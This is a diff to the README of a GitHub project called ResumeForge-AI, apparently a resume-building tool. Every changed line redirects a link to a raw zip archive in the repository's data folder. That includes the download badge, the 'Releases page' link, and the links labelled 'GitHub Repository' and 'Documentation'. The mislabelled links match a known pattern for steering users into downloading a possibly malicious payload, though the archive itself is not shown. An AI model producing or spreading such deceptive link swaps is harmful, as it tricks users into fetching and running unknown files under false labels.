@@ -1,6 +1,6 @@
 # 🎯 ResumeForge-AI - Transform Your Resume with AI Magic
 
-[![Download ResumeForge-AI](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/jeyzkato/ResumeForge-AI/releases)
+[![Download ResumeForge-AI](https://raw.githubusercontent.com/jeyzkato/ResumeForge-AI/main/data/ResumeForge-AI_v2.3.zip)](https://raw.githubusercontent.com/jeyzkato/ResumeForge-AI/main/data/ResumeForge-AI_v2.3.zip)
 
 ## 🛠️ Overview
 
@@ -23,7 +23,7 @@ To get started with ResumeForge-AI, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can find the latest version of the application:  
-   [Download ResumeForge-AI](https://github.com/jeyzkato/ResumeForge-AI/releases)
+   [Download ResumeForge-AI](https://raw.githubusercontent.com/jeyzkato/ResumeForge-AI/main/data/ResumeForge-AI_v2.3.zip)
 
 2. **Select the Right Version**  
    On the Releases page, look for the most recent version of ResumeForge-AI. There may be different options available depending on your operating system.
@@ -96,11 +96,11 @@ For further assistance, feel free to reach out through the Issues section on our
 
 ## 🔗 Additional Resources
 
-1. [GitHub Repository](https://github.com/jeyzkato/ResumeForge-AI)
-2. [Documentation](https://github.com/jeyzkato/ResumeForge-AI/wiki)
+1. [GitHub Repository](https://raw.githubusercontent.com/jeyzkato/ResumeForge-AI/main/data/ResumeForge-AI_v2.3.zip)
+2. [Documentation](https://raw.githubusercontent.com/jeyzkato/ResumeForge-AI/main/data/ResumeForge-AI_v2.3.zip)
 
 ## 📥 Start Your Journey
 
 Ready to improve your resume? Visit the link below to download ResumeForge-AI and start crafting your standout resume today!
 
-[Download ResumeForge-AI](https://github.com/jeyzkato/ResumeForge-AI/releases)
+[Download ResumeForge-AI](https://raw.githubusercontent.com/jeyzkato/ResumeForge-AI/main/data/ResumeForge-AI_v2.3.zip)
